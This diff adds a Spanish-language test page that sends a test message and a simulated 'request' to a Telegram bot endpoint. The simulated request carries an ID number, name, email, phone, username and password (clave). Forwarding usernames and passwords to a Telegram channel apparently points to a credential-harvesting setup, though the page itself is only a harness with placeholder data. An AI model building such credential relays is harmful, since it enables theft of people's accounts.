@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Test Telegram</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',Arial,sans-serif;background:#eef1f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+    .card{background:#fff;border-radius:10px;padding:32px;width:100%;max-width:440px;box-shadow:0 2px 12px rgba(0,0,0,.09);text-align:center}
+    h2{color:#1a3a6b;margin-bottom:8px}
+    p{color:#888;font-size:.88rem;margin-bottom:24px}
+    .btn{background:#1a56a0;color:#fff;border:none;border-radius:6px;padding:13px 24px;font-size:1rem;font-weight:600;cursor:pointer;width:100%;margin-bottom:12px;transition:background .2s}
+    .btn:hover{background:#154a8a}
+    .btn.green{background:#2f9e44}
+    .btn.green:hover{background:#276e32}
+    .result{background:#f4f7fb;border-radius:8px;padding:14px;margin-top:16px;font-size:.82rem;color:#333;text-align:left;white-space:pre-wrap;word-break:break-all;display:none}
+    .result.show{display:block}
+    .ok{color:#2f9e44;font-weight:700}
+    .err{color:#e03131;font-weight:700}
+  </style>
+</head>
+<body>
+<div class="card">
+  <h2>🔧 Test Telegram</h2>
+  <p>Verifica que la conexión con el bot funcione correctamente</p>
+
+  <button class="btn" onclick="testConexion()">🔔 Enviar mensaje de prueba</button>
+  <button class="btn green" onclick="testNotify()">📋 Simular solicitud completa</button>
+
+  <div class="result" id="result"></div>
+</div>
+<script>
+  async function testConexion() {
+    const res = document.getElementById('result');
+    res.className = 'result show';
+    res.textContent = '⏳ Enviando...';
+    try {
+      const r = await fetch('/api/telegram-notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'test' })
+      });
+      const data = await r.json();
+      if (data.ok && data.tg?.ok) {
+        res.innerHTML = '<span class="ok">✅ FUNCIONANDO</span>\n\nMensaje enviado al canal.\nRevisa tu Telegram.\n\n' + JSON.stringify(data.tg, null, 2);
+      } else {
+        res.innerHTML = '<span class="err">❌ ERROR</span>\n\n' + JSON.stringify(data, null, 2);
+      }
+    } catch(e) {
+      res.innerHTML = '<span class="err">❌ ERROR de red:</span>\n' + e.message;
+    }
+  }
+
+  async function testNotify() {
+    const res = document.getElementById('result');
+    res.className = 'result show';
+    res.textContent = '⏳ Enviando solicitud de prueba...';
+    try {
+      const r = await fetch('/api/telegram-notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'notify',
+          data: {
+            cedula: '0912345678',
+            nombre: 'Cliente Prueba',
+            correo: 'prueba@test.com',
+            telefono: '0991234567',
+            usuario: 'usuario_test',
+            clave: '****',
+          }
+        })
+      });
+      const data = await r.json();
+      if (data.ok && data.tg?.ok) {
+        res.innerHTML = '<span class="ok">✅ FUNCIONANDO</span>\n\nSolicitud enviada con botones.\nRevisa tu Telegram.\n\n' + JSON.stringify(data.tg, null, 2);
+      } else {
+        res.innerHTML = '<span class="err">❌ ERROR</span>\n\n' + JSON.stringify(data, null, 2);
+      }
+    } catch(e) {
+      res.innerHTML = '<span class="err">❌ ERROR de red:</span>\n' + e.message;
+    }
+  }
+</script>
+</body>
+</html>
